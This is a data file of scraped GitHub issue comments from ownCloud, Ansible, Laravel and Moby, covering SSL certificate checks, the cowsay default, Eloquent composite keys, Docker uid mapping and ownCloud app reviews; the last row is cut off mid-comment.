core/owncloud/2932/16464864,"locale support is essential and systems without it are not supported. Sorry we cant support all devices, but you can always send us a pull request ;) ",,False,False,2932
ansible/ansible/17811/180080677,"ISSUE TYPE  Bug Report  COMPONENT NAME vmware_inventory ANSIBLE VERSION CONFIGURATION OS / ENVIRONMENT SUMMARY ♠vmware_inventory` blindly accepts the SSL certificate at the moment - regardless of it being part of a genuine chain or a self signed cert. Convenient, possibly, but not the height of security. Really we should have an option to accept a certificate or not so people can decide their attitude to risk. STEPS TO REPRODUCE EXPECTED RESULTS Reject or accept connecting to vsphere over SSL based on an option. ACTUAL RESULTS Inventory script always connects, no matter what the certificate is. ",,False,False,17811
ansible/ansible/10530/64088537,"Having cows fill my screen when running a playbook is not the expected behavior, and makes it hard to visually parse the output of ansible. Since cowsay is enabled not by a setting, but just by the presence of the cowsay binary on the system, it is a surprise whether or not cows will appear when I run ansible-playbook on a new system. Instead of putting the burden of setting an environment variable on people who don't want cows, the default should be normal text output with no cows. The environment variable should be renamed from ""ANSIBLE_NOCOWS"" to ""ANSIBLE_COWS"". This way, we get a sane, unsurprising default, but people can still get their cows if they so desire. ",,False,False,10530
ansible/ansible/10530/85674377,"Pure heresy, I say!  wink ",,False,False,10530
ansible/ansible/10530/85675108,"I don't see what the problem is here. If you have cowsay installed, you obviously want to use it. If not, you'd uninstall it. ",,False,False,10530
ansible/ansible/10530/116367283,plus one I have a recurring nightmare of demoing a new CD system to all of engineering and having cows fill my screen and getting fired. ,,False,False,10530
ansible/ansible/10530/117723140,,,False,False,10530
ansible/ansible/10530/117819151,"Just wanted to point out one thing that I wasn't sure if the original poster noticed In ansible.cfg you can set if you would like to set this in your environment, just set the configuration option in the ansible.cfg file. ",,False,False,10530
ansible/ansible/10530/117840301,,,False,False,10530
ansible/ansible/10530/374271097,"I agree this is very annoying. I also think your attitude towards this very disappointing. Yes, this is a fun feature. But it's fun exactly three times, then you realize your ansible output is now basically unreadable. I can set it in a config file, yes, but when using e.g. a pull configuration, this isn't really an option. I have to ensure to enable an option in a config file on every host that might ever run some ansible command, just so I can get rid of some easter-egg I never even enabled in the first place. Isn't ansible supposed to make our lives easier? Maybe consider the fact that many people complain about it and even send PRs as a sign that this is annoying to many people, and please reconsider disabling it by default. ",,False,False,10530
ansible/ansible/10530/382208517,"Hay there. I'm moo here. I herd you mooved on, but cowbell we re-open this issue. Stop hoofing around, I think you've milked this joke long enhoof. Please remoove this behavior, I beg of you, leather you like it or not, it's caused issues even though there is no farm intended.  I was calfway through provisioning my EC2 servers and this bull appeared. But I digrass, this joke is the worst I'd heifer seen. It's the last straw. I've got no beef with you, but cattle you see that people are upset?  Please reconsider. Bessie of luck to you all. ",,False,False,10530
ansible/ansible/10530/390709203,A co-worker (not cow-orker!) suggested I weigh in on this thorny subject. ,,False,False,10530
ansible/ansible/10530/392319998,"You should be careful with features like this they can ruin product demonstrations if they fire off unexpectedly.  Many years ago I was demonstrating something in Linux.  I had to use sudo and I got one of the joke responses that it used to give when you mistyped your password.  'Oh yes, the err, author, does have a bit of an, um, sense of humour.'  It's unexpected so you've got nothing prepared, and it makes it look as though the product designers are not taking their role seriously.  I know that both Ansible and sudo are serious products, but my audience may not. ",,False,False,10530
ansible/ansible/10530/393690519,My biggest beef with this is that the beef takes way too much vertical space. Having it default to off would be preferred. ,,False,False,10530
ansible/ansible/10530/393693359,I see what you did there... ,,False,False,10530
framework/laravel/5355/39602742,"Eloquent assumes heavily that you are using surrogate keys on your tables (the  field in every table). However in real world usage, particularly older database systems not designed with web frameworks in mind, there are often tables with composite keys. That is, the primary key is over two or more columns. Often, you can't just add autoincremented id's. This is definitely a game stopper for a lot of use-cases, where you are forced to access existing RDBMS (e.g. building a frontend for an existing db). See also this reddit post about this issue. The schema builder has already support for composite keys, however eloquent doesn't seem to support it yet. I request the feature to use composite keys in your eloquent models and queries. The default configuration for surrogate keys is fine, just add the option. ",,False,False,5355
framework/laravel/5355/51374218,I would like to have this supported too. ,,False,False,5355
framework/laravel/5355/51420165,Me too. ,,False,False,5355
framework/laravel/5355/52976163,"I agree, this is extremely annoying at the moment. Unfortunately I'm not in charge of a lot of data I need to access. For the moment, I'm just overriding  in my models by doing something like ",,False,False,5355
framework/laravel/5355/52988479,@friend this is a good workaround. So did you specify  with one field and added the second field as a where-clause in the newQuery method? ,,False,False,5355
framework/laravel/5355/53266220,You could view my bug report (#5517) which has a work-around that works flawlessly for me. ,,False,False,5355
framework/laravel/5355/53365455,"@friend Yes, that is exactly what I did. In my case I was using a  and a bunch of child classes that extended my , so I had a  and a . ",,False,False,5355
framework/laravel/5355/61826967,I would really like to have this supported as well. ,,False,False,5355
framework/laravel/5355/63573747,"I put this in my Eloquent Model subclass to enforce my extra column ('locale').  Maybe it'll help someone. ♠php     protected function setKeysForSaveQuery(Builder $query)     {         parentsetKeysForSaveQuery($query);         $query-&gt;where('locale', '=', $this-&gt;locale);         return $query;     } ",,False,False,5355
framework/laravel/5355/67331320,plus one I just get an common error while saving model with composite keys♠` ,,False,False,5355
framework/laravel/5355/72057268,I want it! ,,False,False,5355
framework/laravel/5355/72158649,"-1 This is not ""should"" stuff. Please keep Eloquent simple. As you mentioned, query builder supported it, so it is enough. Don't do every thing by Eloquent. Just use query builder, results became collections in L5, so what problem? ",,False,False,5355
framework/laravel/5355/72261848,I doubt this will ever happen. ,,False,False,5355
framework/laravel/5355/75343239,"Why do you doubt this will ever happen? Composite keys are extremely common, if the SchemaBuilder supports it why wouldn't you want to have it supported by Eloquent as well? Sometimes using surrogate keys are wasteful, especially if you're using UUIDs as identifiers... having a useless column you never search on that just takes up table &amp; index space is silly sometimes. Keeping Eloquent ""simple"" is a very silly reason. To the end-user nothing changes - but they now have the ability to specify an array for the primary key. If Laravel/Eloquent really expects to be taken seriously and provide further credit for using PHP for web development it should naturally support what every other ORM supports for alternative web development libraries. Using pivot only is doable when you have a few extra columns on your relation... otherwise it's very awkward. Using the query builder for saving &amp; deleting is kind of silly, why would anyone want those inconsistencies in their code? Some places you use Eloquent for saving/deleting and some places you use QueryBuilder? This kind of attitude is poor and sounds lazy. If Laravel is open to receiving a feature like this, I would be more than willing to supply a nice simple and efficient solution. ",,False,False,5355
framework/laravel/5355/77016178,"plus one Maybe in 90% of my projects I use composite primary keys. For localisation and for one to many relationships composite keys is the best practice for me... I'm very dissapointed that in Laravel 5 there is no composite keys, but a lot of complicated design patterns. That is my opinion. Don't want to argue with anyone. ",,False,False,5355
framework/laravel/5355/77033772,"Eloquent follows the Active Record convention, so it needs a single primary key to work. If you need composite keys in your project, maybe Eloquent isn't the best tool for it. ",,False,False,5355
framework/laravel/5355/77036060,"The Active Record pattern makes no restrictions about primary keys - I don't know where you're getting that from. Eloquent/Laravel is currently developed to work with a single primary key, there's no reason why someone shouldn't be able to make a contribution to the project which adds composite keys. What is the best way to go about this? ",,False,False,5355
framework/laravel/5355/77043680,"All I'm saying is that this is a convention in other frameworks as well. Since Rails made it popular, the other frameworks followed the same path, that's what we see out there with most PHP frameworks (except Yii 2, for what I know). Don't get me wrong, I would love to see Eloquent working with composite keys but I agree with Campbell, we're not going to see that happen so soon and my opinion is that I don't think it's worth the trouble. Well, only Taylor can tell ) ",,False,False,5355
framework/laravel/5355/77046617,"If the current contributors aren't interested in implementing this feature, I'm more than willing to submit how I'm going to solve it (so I don't waste my time and have it be later rejected) - I just don't know who exactly to message to get the go ahead to work on it. ",,False,False,5355
framework/laravel/5355/77048059,Please pose questions to Taylor. He's the only one that can say yes/no to proposals. ,,False,False,5355
framework/laravel/5355/77048144,"As things stand, this issue is rejected, so it's unlikely for this to make it into the framework. ",,False,False,5355
framework/laravel/5355/77366485,@friend are you willing to accept a pull request for this proposal? ,,False,False,5355
framework/laravel/5355/83238386,"@friend please respond, I'd love this ",,False,False,5355
framework/laravel/5355/83944404,Just hit this bump as well. Would love support for composite keys. ,,False,False,5355
framework/laravel/5355/90965240,I want this feature badly. ,,False,False,5355
framework/laravel/5355/90974643,This seems like a package waiting to happen more than something that needs to be added to the framework. I agree with @friend . Just switch out your ORM to Doctrine 2? Is that a logical solution? Article here Doctrine Composite Keys ,,False,False,5355
framework/laravel/5355/95302088,Yes this would be great to have. ,,False,False,5355
framework/laravel/5355/95648701,I would also love to see this being implement within Eloquent.  Why would it be rejected as a proposal? If the $primaryKey property could be an array of columns it would be awesome. ,,False,False,5355
framework/laravel/5355/107998144,plus one for composite primary key support ,,False,False,5355
framework/laravel/5355/111477673,More one L5 user needs composite key =&gt; me !!! ,,False,False,5355
framework/laravel/5355/111507996,"Its works!!!  I ignored the model of the relationship table and set ""belongsToMany"" in the two tables with a little details set the two  foreign key of two tables and set the name of the relationship table. The whole foreign keys will works like a composite key. Ex //--------- Model ""Table1"" ------------// class Table1 extends Model { ... public function table2()     {         return $this-&gt;belongsToMany('App\Table2', 'table_relashionship', 'id_table2', 'id_table1');     } } //--------- Model ""Table2"" ------------// class Table2 extends Model { ... public function table1()     {         return $this-&gt;belongsToMany('App\Table1', 'table_relashionship', 'id_table1', 'id_table2');     } } Now the Eloquent undestand that you have a 'table_relashionship' in your database with columns 'id_table1' and 'id_table2' and you can access the data with the comand $table1 = Table2find(1); dd($table1-&gt;table2) Its solve my problem! ",,False,False,5355
framework/laravel/5355/113053162,"plus one for composite primary keys. In my opinion, using composite primary keys gives more clarity of the code as it shows that it is a dependent model (aggregate) of an entity model. Thus,  the dependent model cannot exists without its parent entity (or the aggregate root). ",,False,False,5355
framework/laravel/5355/115407820,"I am BAFFLED by the decisions being made. This is a COMMON practice in database design, and pushing people to hack their table designs to work with eloquent rather than support such a common practice is insane to me. ",,False,False,5355
framework/laravel/5355/115410016,"@friend to be fair, it is not supported by Rails either. It is not as if every major framework supports this and Laravel is refusing to. ",,False,False,5355
framework/laravel/5355/115417969,"@friend I'm in the same camp, I realize it's not a super requested feature, and even less so with new developers. And true, lots of other frameworks haven't done this either. It's actually a great thing that people are asking - what I hear them saying is they want to use Laravel! I feel like there are a few options for those of us in need of this functionality 1) Don't use eloquent, use query builder instead. 2) Don't use eloquent, use a different ORM like doctrine 3) Fork Eloquent to a new project and update it to support CK - let those that need it pull from that repo. Taylor can you share your vision of where Composite Keys fit in Laravel long term? i.e. Are CK's something you see as desirable, just further down the roadmap? Or are CK's something you feel are not a good fit for what you're trying to do with Laravel?  Jack  ",,False,False,5355
framework/laravel/5355/115426172,"I currently have no plans to implement composite key support. On Thursday, June 25, 2015, Jack notifications@friend.com wrote ",,False,False,5355
framework/laravel/5355/115432155,"Thanks Taylor, I appreciate the clarity! ",,False,False,5355
framework/laravel/5355/115494838,"Extend Laravel, make a package, release it and then all the peoples can use it. Just because its not part of the framework doesn't mean this can't be done. ",,False,False,5355
framework/laravel/5355/121647027,@friend A fork might be more appropriate. I've looked through all of the code myself and refactoring it to include composite keys provides an opportunity to clean up the code a bit (all of the joins due to relationships has a lot of repetitive string concatenation code). I think if you write out the few different ways to add conditions &amp; joins to a query in separate methods (on a new class?) it will give you a single place to handle the composite key logic instead of all over the Eloquent code base. Just my 2c ,,False,False,5355
framework/laravel/5355/121649505,"@friend Agree 100%, still a little way to go (I was crazy busy last week) but I've made good progress so far. I'm updating the database tests as I go which is a big time sink. ",,False,False,5355
framework/laravel/5355/123746088,I would enjoy seeing this myself too but I'm okay using the query builder to get the job done. It means I will have to update the timestamps myself but nothing major. ,,False,False,5355
framework/laravel/5355/123750468,"@friend I tried using query builder and I've got it working, but it's a ton more work, since you can't just assign the request data to the ORM to have it save a new record. So lots of mundane code to assign each and every field. @friend How is progress going on the fork?  I've considered trying doctrine, but I think a fork of Eloquent would be easier to use. ",,False,False,5355
framework/laravel/5355/127943348,"It's confusing that the builder can create primary composite keys while the Eloquent can't, kind of inconsistent, isn't it? ",,False,False,5355
framework/laravel/5355/128032122,@friend Not really. I'm pretty sure there are people who use the schema and query builder without Eloquent models. ,,False,False,5355
framework/laravel/5355/128315346,"@friend I'd argue that it's actually quite a disconnect between two integral parts of the framework.  One can build schema in such a way that it can't be used with the existing Eloquent API. It feels like a fight with the tooling, which is a red flag to me. The fact that these tools can be used independently is great but I think they should work together with feature parity in the first instance. ",,False,False,5355
framework/laravel/5355/128322713,plus one for composite primary keys. ,,False,False,5355
framework/laravel/5355/128812228,Me too. plus one for CK. ,,False,False,5355
framework/laravel/5355/144310186,"I was just silently listening this thread for a year, still nothing new? I'm playing with the idea of coding an Eloquent extension specifically for supporting comp keys until this feature comes out. ",,False,False,5355
framework/laravel/5355/150525431,this should be locked ,,False,False,5355
framework/laravel/5355/150529199,lol - I don't lock issues anymore because it causes massive rage ,,False,False,5355
framework/laravel/5355/152518856,Why should this issue be locked? ,,False,False,5355
framework/laravel/5355/152519370,Because of what Taylor said about this feature ,,False,False,5355
framework/laravel/5355/152519704,So just because other frameworks don't support it means Laravel doesn't need to? In fact I would think this would be a driving force TO support it since it will be yet one more feature it has that other frameworks don't. ,,False,False,5355
framework/laravel/5355/152524210,I (and a lot of others) totally agree with you. It's quite a common thing to use in database tables that simply don't require a 'id' field. ,,False,False,5355
framework/laravel/5355/152543718,"Taylor's response is interesting. It could one of a few things.  He doesn't think Laravel can/should be better than Rails. He knows this is an excuse for not wanting to do it himself. Could be lack of time or passion. He protests the idea of composite keys, because some folks actually think you should always have a surrogate key.  I don't mean to pick on him, he's done fantastic work, but with all of the support this issue has gotten I think we need a well thought out reason on why Laravel will never have composite keys OR, even better,  what can be done to get this done. After assessing what needs to be done to get composite keys working I can understand why he would want to avoid it. I think it would lead to a very healthy refactoring of the relationship classes. As I've said before, If he's willing to accept a patch for this feature there are many people who want to work on this. If he's hesitant because he has specific things in mind for this feature - or lines he wouldn't want crossed, he could communicate them to us on this issue. Outside of my work in PHP, ALL ORMS I've developed or used in the real world supported composite keys (Java might've spoiled me) so I find other libraries being hesitant a little odd. As I've said before, Laravel to me completely legitimizes developing large and well architected websites in PHP. The company I work for has used it dozens of times for small to large clients. It's definitely one of my favorite frameworks - save this one thing. Laravel's tagline shouldn't be ""At least as good as the competition"". ",,False,False,5355
framework/laravel/5355/152545283,@friend I don't think @friend would reject if you/anyone can come out with a complete Pull Request to add composite key support for Eloquent. You can't expect someone that doesn't use composite key him/herself to create such feature. I myself would never consider making that PR because I don't have all the knowledge to cover all possible use case. ,,False,False,5355
framework/laravel/5355/157296472,"I rarely use surrogate key if it's meaningless, and I use composite keys a lot in applications. I don't see a good reason to force using surrogate key. So please support composite keys in Eloquent. ",,False,False,5355
framework/laravel/5355/157308273,"May be if we collect enough ""plus one"" I will make the solution ",,False,False,5355
framework/laravel/5355/157671662,"Guys this is ridiculous, while I really enjoy working with Eloquent, the idea of adding a completely useless column just to ""make it work"" is unacceptable. This is such a no-brainer, Doctrine 2 does have native support for composite keys as well. Why not Laravel?! plus one! ",,False,False,5355
framework/laravel/5355/158071202,I would like composite keys plus one ,,False,False,5355
framework/laravel/5355/160483799,"plus one for composite primary keys, there's no good reason to force using surrogate key, is there? In addition, the fix proposed on #5517 is ridiculously simple and works flawlessly, I don't see why you wouldn't merge it on master. A pity. ",,False,False,5355
framework/laravel/5355/160632899,"Composite keys are really useful in use cases where you have an NxN table with a High read and write throughput. I guess one could argue in that case you don't use auto_increment, you should use a hash as primary_key instead of integer and suck it up using an UNIQUE constraint, but in my point of view this ""workaround"" is not the ideal scenario for a situation like this, it just creates confusion in something that should be simple. ",,False,False,5355
framework/laravel/5355/161376267,plus one I put here my own solution I'm using a Abstract Model which one final model has extended and in his private property of primaryKey I declared an array with the name of each field on my composite key. ,,False,False,5355
framework/laravel/5355/162322797,This is just sad. plus one for all its worth... ,,False,False,5355
moby/moby/22415/151859257,"Before getting into the details, I want to point out that I suspect a feature like what I'm about to suggest could solve many permission related snags when using Docker. So as to prevent this suggestion from getting mired in philosophical objections, this ticket is not advocating permanently storing credentials inside a container.  I don't do that and I don't suggest anyone else do it either!  tldr; The current method of UID spoofing inside of a container via  has limitations that end up mandating entire ecosystems of one-offs and very problematic workarounds to massage container state into the right frame of mind.  This is worsened by the fact that the need to perform these workarounds is influenced by what platform you are calling Docker from. The feature I'd like to request is to have a flag added to  (and equivalents) that tells Docker to map all filesystem operations that a container performs to a specific user host-side.  This is very different to  which simply sets the user of the process that runs inside the container. If you're interested in an extended explanation, read on!  Rationale We've all heard about people having issues with temporarily binding SSH credentials and similar  &amp;  related difficulties. Something that I've noticed when using Docker on OSX and Windows however is that I'm actually freed from the challenges of ensuring my ephemeral development containers (my primary use case) aren't writing files to the filesystem as root!  This is owed to the fact that they both rely on a variety of bridges back to the native platform's filesystem. One non-exclusive example is when trying to forward either an SSH socket or the SSH directory on a Linux host, because SSH insists on proper home directories, I've been unable to get secure connections working without having to make my container aware of the environment it is running in!  The best I've been able to dream up is bind mounting ,  and  into the container.  Which is exactly as horrible as it sounds, but also my only choice given that I don't know what uids will be right for the host filesystem.  This clearly runs against Dockers attitudes towards portability. Another more common example would be when files are created by the container, if the bound filesystem is ext or otherwise linux-compatible, the UID of files is set to root (or whoever I run my container as).  On Linux, in order to not blast my filesystem with files having UID/GID 0, I have to tell my containers to run their processes as my current user via . This might work in trivial scenarios, but again ends up falling apart in situations where the user system inside of the container is different to the host or the binaries being run enforce  directory requirements like SSH above.  No host is likely to ever have a reliable way to influence the user system inside the container.  This is especially true when using images produced by third parties. So, I currently am stuck avoiding the complexity by staying as root.  Everything works because all containers have a root user fully configured.  But now without any better option, all Docker containers that want to avoid being polluted with hacks are forced to write files as UID 0! As I mentioned above, switch over to Windows or OSX and this problem goes away because they don't share the same users as the container and the filesystems aren't compatible.  Instead, vboxsf, samba and other drivers are actually emulating the feature I'm requesting here! So, this clearly identifies the fact that while it's nice to control who the container runs its process as, it would actually be more desirable to optionally map the uid (and gid?) flag for any changes to the filesystem from the container, host-side. All the while, still allowing the container to function as whoever it needs to be internally. This jives with the philosophy that Docker containers should be portable and require zero awareness of the environment that is running them.  Indeed if you examine the nature of this suggestion, it's conceptually parallel to binding ports and bind mounting filesystems. We need a way to bind users as well. ",,False,False,22415
moby/moby/22415/485826290,@friend are you are of any progress or discussion that has been around this since your post? ,,False,False,22415
moby/moby/22415/486790654,"Nope, and I was even thinking about this issue today.  IIRC, @friend agreed with the value behind such a feature, might have been advocating for it internally (correct me if I'm wrong 😅). This is probably one of the more glaring oversights in the docker platform and in a strange twist, keeps me preferring to work with it on macOS/Windows instead of natively on linux! Feel free to retweet, this issue is as old as my daughter! ",,False,False,22415
moby/moby/22415/486892381,"If the main issue is to have the ability to bind-mount files from your host into a container, then this is largely the same issue as;   User namespaces - Phase 2  Add ability to mount volume as user other than root  And comes down to the ability to remap user-ids inside the container. This might be possible with a kernel that supports shiftfs or a FUSE filesystem. @friend did some work on something in this area in  (implementing a FUSE driver to do uid/gid remapping), and in a WIP pull request to use it for userns; ",,False,False,22415
moby/moby/22415/486898958,"Doesn't that end up requiring the container to have special setup? The idea here is that regardless of what the container chooses to do to the filesystem it sees, any writes coming out of it are abstracted to specific uid and/or gid. ",,False,False,22415
moby/moby/22415/486900204,"It's not something that should be (or could be) enabled by default, as;  docker won't know what mapping to make (i.e. wouldn't know what local uid/gid you want to map to which uid/gid inside the container) by default ignoring/mapping uid/gid means that a non-privileged user inside the container would get full access to bind-mounted files from the host (files which could be accessible to certain users only).  For Docker Desktop (Docker for Mac / Docker for Windows), the ""ignore ownership"" feature was implemented because Docker Desktop is targeted at developer use-cases, not for production (in production situations, giving a container access to files on the host is especially not desirable) ",,False,False,22415
moby/moby/22415/487029036,"I'm not sure I understand the distinction ~""people dev on Windows/macOS"" as I'm sure plenty of people develop on linux as well.  If that's really an explanation for the difference in behaviour, they surely need some equivalent that is easy to use. The mappings should be configured per volume.  So if I bind a volume to a container, I should be able to set a uid and/or gid that all write operations to that volume map out to on the host.  Internally the container will retain its own behaviour, but I can't have containers that write to uids and gids that might not even be configured on my host system. There is clearly a missing abstraction here. ",,False,False,22415
moby/moby/22415/487038969,"The missing abstraction is this is simply not possible on Linux without fuse. Docker for Mac uses fuse to do this, and it's horribly slow for most use cases. ",,False,False,22415
moby/moby/22415/488292501,"@friend - Sorry, can you elaborate?  I might not be following on that one, why would FUSE be necessary? Really, what this ticket represents applies regardless of what the current state of things is.  I don't think it's at all a stretch to say that my  and  can't possibly be expected to harmonize with every container and every permutation of them I can end up running.  Obviously the same applies for the containers own assumptions internal to themselves as well. As a practical but still contrived example If I'm running on a system and one container writes as , another uses  and another is using , they will all write as whatever the corresponding uid maps out to internally.  To the host though, those uids could end up being anything.  Worse still, between containers, you have a whole other set of permutations to deal with. To me, it seems like the only possible answer here is that we need some way during instantiation to abstract the filesystem operations that originate from within the container to the local system.  More importantly, this has to be possible without having to put that information in the containers themselves. Ideally Each container is responsible for its own security abstractions and when configured, have all operations performed on bound filesystems mapped to a specific uid/gid as defined by the host. ",,False,False,22415
moby/moby/22415/488300988,"FUSE is required because there is no way to do these mappings at the filesystem level. See ""shiftfs"" for an attempt to bring this into the kernel generically. ",,False,False,22415
moby/moby/22415/488367817,Would super be nice if docker abstracted something like that. ,,False,False,22415
moby/moby/22415/490561851,"Could we have an an option to use FUSE on Linux then? This issue causes huge amounts of problems for devs who use linux in our organisation and maintaining workarounds to let them do their jobs is irritating. I accept that there will be performance issues with that - but since we mostly use Docker for Mac that's really not a concern for us. I'd rather have ""slow and working"" over ""fast but broken"" any day. ",,False,False,22415
moby/moby/22415/490646584,FUSE support would be awesome!  A lot better than setting up rsync scripts which I'm doing now which is a pain.  I've also considered adding ssh service to my containers just to use sshfs to work around this issue. ,,False,False,22415
moby/moby/22415/490657128,I've been experimenting specifically with a filesystem for mapping UID/GID's mapped for user namespaces...  something like this might work for mapping a name in the container to a name on the host... I'd leave that to people who are interested in this. I guess we already process /etc/passwd in the container for  (but it's horrible and doesn't work for some cases). ,,False,False,22415
core/owncloud/17122/90504961,"On my local copy of master, I did not tick the box to show experimental apps and yet I see all the apps I installed myself, labelled as experimental. The first step would be to fix the bug and respect the tick box when showing/hiding non-approved apps. In 8.2, it would be great if the system could differentiate between a corporate, private app which was installed in a specific, trusted folder and one coming from the app store. ",,False,False,17122
core/owncloud/17122/114659212,Experimental apps only affect the one displayed in the categories from the appstore. – Nothing is filtered on already installed or disabled applications as this will give a wrong expectation what actually is installed. ,,False,False,17122
core/owncloud/17122/114659770,"Then I think the wording of that setting should be changed. It's not about enabling experimental apps, but about listing the ones which are available through the app store. ",,False,False,17122
core/owncloud/17122/115223230,@friend you might have an idea to get better UX on this one? ,,False,False,17122
core/owncloud/17122/115231706,"Well, you must have enabled experimental apps then before or installed apps locally. Which apps does this happen for? ",,False,False,17122
core/owncloud/17122/115245967,"It happens for all apps which were installed locally and which are not labelled as official. You can't have a tick box for ""Enable experimental apps"" and then still show them when it's disabled. Perhaps the description should be modified to ""List experimental apps from the app store"", but it might still be confusing if a user enables an experimental app, disables it, unticks the setting and still sees it listed in his ""Not enabled"" list, under ""Experimental applications ahead""... ",,False,False,17122
core/owncloud/17122/115257762,"For apps which are approved / official in the app store but you clone locally, the fix is at  – please review ) In the other cases I think the behavior is correct. ",,False,False,17122
core/owncloud/17122/115261392,"OK, that fix will at least remove the label from official/approved apps, but we still need to either filter out experimental apps if the switch is disabled or rename the switch to make it clear that it's only about the app store.  ",,False,False,17122
core/owncloud/17122/115263740,"Ah right! Ok so what we need to fix in this case is to not show experimental applications which are disabled, when the setting is not checked. (Sorry it took me so long to get it. ;) But when you checked »enable experimental apps«, then installed one, and then uncheck the setting again – that app should still be listed and be installed of course. Only once you disable it should it be removed from the list. So @friend can you submit a pull request for this? ) ",,False,False,17122
core/owncloud/17122/115264787,I disagree with this one. From my PoV we should show even untrusted applications even if they are disabled since the code is technically still existent on the server. – Either we change the wording or we leave it as-is (what I'd do) from my PoV. That local applications get an experimental rating if they don't have a rated OCS ID and no shipped tag is a whole other topic. ,,False,False,17122
core/owncloud/17122/115266620,"Maybe add a warning at the end of the list that experimental applications are not listed due to our preferences (something along those lines), just to make sure those apps are not forgotten? ",,False,False,17122
core/owncloud/17122/115272170,"Right, they still exist on the server. I don’t have strong design arguments either way so I think it’s fine to just keep it as it is. You installed stuff yourself after all, so it’s non-standard usage. If there’s massive confusion coming up, we can still change this. But for now I would say let’s keep it as it is. Ok @friend? (We’ll see how it’s received with the 8.1 release.) ",,False,False,17122
core/owncloud/17122/115282581,I think it wouldn't hurt to reword the title. The description needs to be rewritten anyway since it's not using proper English and is too aggressive. ,,False,False,17122
core/owncloud/17122/115283438,Keep in mind this warning is for regular admins who don’t necessarily all know what they are doing on their small instances. So it’s ok to state that there are likely to be security issues etc. ,,False,False,17122
core/owncloud/17122/115287465,"True, but it's the pot calling the kettle black. I've lost more data through the use of core apps than with 3rd party apps ;). Some points could be softened as follows ""... have not been as thoroughly tested"" ""... could cause unwanted side effects"" You have to think about the feelings of app devs who've spent a lot of time working on their projects and whose apps are instantaneously categorized as something to avoid, when an app like  per example, which is alpha quality and under ""heavy development"" gets the ""approved"" rating. ",,False,False,17122
core/owncloud/17122/115288916,"One more reason to quickly introduce channels ( So that even approved apps can be filtered out, depending on their stability. And I think ""Experimental"" is the wrong adjective. ""Untested"" maybe? ",,False,False,17122
core/owncloud/17122/115376250,"@friend you are welcome to join the ownCloud apps review team! ) Join #owncloud-app-review The Mail app was approved because well, it was thoroughly tested by @friend, @friend and me – so it’s basically design-, dev- and security-reviewed. Also, it’s in pretty wide use already and hasn’t eaten any emails. ) ",,False,False,17122
core/owncloud/17122/115382738,"I would probably only have time to review apps once a month S and I don't think I would approve many apps as most use private APIs and/or are missing descriptions. Regarding mail, I was referring to the statement made on the project's page in the app store. It's a 0.1 release ""under heavy development"" which is exactly how the apps settings page describes experimental apps.  I think you have to be careful how you manage this side of things. I've already heard devs grumble about how their work is being treated and @friend is hoping to increase the number of apps tenfold. That requires happy devs ) ",,False,False,17122
core/owncloud/17122/115389917,"As you know, the problem is always time. Any devs in particular who are unhappy about the state of app reviews? Then we should all get them into the app review team. ) ",,False,False,17122
core/owncloud/17122/115393199,"I agree that the problem is time, but for something as sensitive as app reviews, I think this needs to be semi-professionally done. People need to be trained, there needs to be a security review, etc. or the approved status is meaningless.  oC names dev an approver Approver approves apps with backdoors (easy to implement and easy to miss unless trained) by mistake Users start to find their data on public forums App is removed, etc., but it's too late, the damage is done  But even with a thorough review process, apps slip through... Look at all the nasty apps which went through Apple's net and they take their sweet time to review apps. On top of that oC doesn't have a remote kill switch... I need to open an issue about that. ",,False,False,17122
core/owncloud/17122/115727464,"@friend I just had a chat with @friend about a related topic and was wondering what you think How about we explicitly ask devs to submit their apps for reviewing? That makes sure that these devs have some kind of commitment and we can be sure that they at least in some way are dedicated to maintaining their app. Then from us (@friend, me and others) they will get code-, security- and design-feedback for their app. And eventually they get approved. I think a call for reviewing like this allows us to focus a bit. Currently one big problem is also that we simply don’t know where to start with the app reviews. If we have a simple submission queue we can work through that more easily. cc @friend if there’s any promo we need to do there. ",,False,False,17122
core/owncloud/17122/115742210,"I think it absolutely makes sense. All mobile devs have to do it in order for their apps to even show in the app stores. It will also help with the communication side and devs will be happy to get feedback on their work. Don't underestimate the amount of work involved on the approving side though. You'll need to publish reasonable acceptance criteria and stick to it. Also, if you're committed to make the AppFramework the preferred way to develop apps, you should definitely introduce a label for it, just like BlackBerry did with their ""Built for BlackBerry"" label. It definitely helps making a first selection. I try to avoid all apps which don't use the framework as it's almost certain they use private APIs and will break sooner rather than later (+ I wont be able to fix them as easily) ",,False,False,17122
core/owncloud/17122/117115763,"@friend a few thoughts.   -&gt; what do you think? This should at least explain our goals ;-) I think even if you have only time to review an app once a month it would still rock if you were able to join the review team. yes, reviews should be done professionally, but we can't limit the reviewers to ownCloud employees, imho. we probably should set up a wiki page where people can easily add a link to their app as a first step in getting a review queue. That would work, yes? That is a barrier for those app developers without a github account but it's a start. and the risks you mention - well, as you say, this even happened to Apple. It is probably not really possible to fully prevent that but once we're target for hackers like that, ownCloud must be so popular we will be able to afford a big team of ppl who review apps ;-) with regards to the wording we have to find a balance between 'properly' scaring (warning) users about the risk of entirely unreviewed apps and being nice to developers. I think the best solution is to ensure that apps get reviewed promptly so the ones in the 'experimental' category really are that - experimental. I know, this is an hard-to-achieve ideal but as @friend points out - that is why we need help ;-)  ",,False,False,17122
core/owncloud/17122/117309367,"Some thoughts about the documentation  Approved apps deemed "" to be stable for casual to normal use"" as opposed to be ready for serious use. What about if a MDM company creates a connector so that ownCloud can be used in their secure container and keeps it in their repo? ""minimum 5 ratings, average score 60/100 or better"". Unfortunately, I think the maths doesn't work here. Apps start at 50 and each click is worth 1 point. There is also an issue with how versioning works. 8.1 apps start at 50 again, so that might confuse users who see approved app with a rating of below 60 when the previous version was in the 70s or 80s. I like the notes about trust levels and audits. Gives a better idea of what is expected of devs to be approved ""warning shows for security/stability risks"" I still don't think it's a good idea. Name one mobile app store which labels its apps as possibly insecure or experimental, apart from the ones in the beta programmes. ""Apps can only use the public ownCloud API""  has to be modified to . The public API is not mature enough. An alternative could be to ask developers to request permission to use some APIs and approvers could use the list of well known methods which don't exist in the public space to vet apps. It would help guide devs into using the proper APIs in case they took the wrong approach and would help the core team better understand which APIs are missing. Why not force the use of the AppFramework for new apps? It would make things much easier to review. There are still a few typos left ;)  Regarding taking part in reviewing apps, I need to do a dry run to see if I can afford the time and if I would add any value to the process. I hate mailing lists, but it does make sense to ask for approval there. Maybe you should provide a template or a web submission form which would auto post to the list and all further communication would happen off list. The only reply to a list post should be that someone has been assigned to the task. After having read the publishing page, I feel better about the review process and the value of the approved label, but I still don't agree on the benefit of scaring away users. Show me another app store which treats its developers that way. If an app is approved by Apple, BlackBerry or Google, it's considered good enough to be of help to any user. Some apps may have a special ""verified"" label next the company name in some 